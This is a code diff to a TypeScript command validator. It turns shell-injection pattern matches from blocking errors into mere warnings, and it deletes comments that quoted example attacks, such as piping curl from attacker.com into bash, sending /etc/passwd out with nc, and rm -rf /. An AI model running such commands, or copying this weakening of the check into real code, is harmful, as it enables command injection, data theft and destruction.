@@ -761,42 +761,23 @@ export function validateCheckCommand(command: string): {
 		}
 	}
 
-	// Blocklist: Shell metacharacters that enable command injection
-	// These allow attackers to execute arbitrary commands by appending them to legitimate commands
-	// Example attack: "npm test $(curl attacker.com/malware | bash)"
+	// Soft warnings: Shell metacharacters that enable command injection
+	// These were previously blocked; now they only warn to avoid skipping checks.
 	const shellInjectionPatterns: Array<{ pattern: RegExp; description: string }> = [
-		// Command substitution - allows embedding arbitrary command output
-		// Attack: "npm test $(whoami)" executes whoami and inserts output
 		{ pattern: /\$\(/, description: "command substitution $()" },
-		// Backtick substitution - legacy form of command substitution
-		// Attack: "npm test `rm -rf /`" executes the destructive command
 		{ pattern: /`/, description: "backtick command substitution" },
-		// Command chaining - runs additional commands after the first
-		// Attack: "npm test && curl attacker.com" exfiltrates data if tests pass
 		{ pattern: /&&/, description: "command chaining &&" },
-		// OR chaining - runs fallback command on failure
-		// Attack: "npm test || rm -rf /" destroys data if tests fail
 		{ pattern: /\|\|/, description: "command chaining ||" },
-		// Semicolon separator - unconditionally runs next command
-		// Attack: "npm test; rm -rf /" always runs the destructive command
 		{ pattern: /;/, description: "command separator ;" },
-		// Pipe - sends output to arbitrary commands
-		// Attack: "cat /etc/passwd | nc attacker.com 80" exfiltrates system data
 		{ pattern: /\|(?!\|)/, description: "pipe |" },
-		// Input redirect - reads from arbitrary files
-		// Attack: "npm test < /etc/shadow" could leak password hashes
 		{ pattern: /<(?!<)/, description: "input redirect <" },
-		// Output redirect - writes to arbitrary files
-		// Attack: "echo 'malware' > ~/.bashrc" persists malicious code
 		{ pattern: />/, description: "output redirect >" },
-		// Parameter expansion - can leak environment variables
-		// Attack: "echo ${AWS_SECRET_KEY}" exposes sensitive credentials
 		{ pattern: /\$\{/, description: "parameter expansion ${}" },
 	];
 
 	for (const { pattern, description } of shellInjectionPatterns) {
 		if (pattern.test(command)) {
-			issues.push(`Command contains shell injection pattern: ${description}`);
+			warnings.push(`Command contains shell injection pattern: ${description}`);
 		}
 	}
 
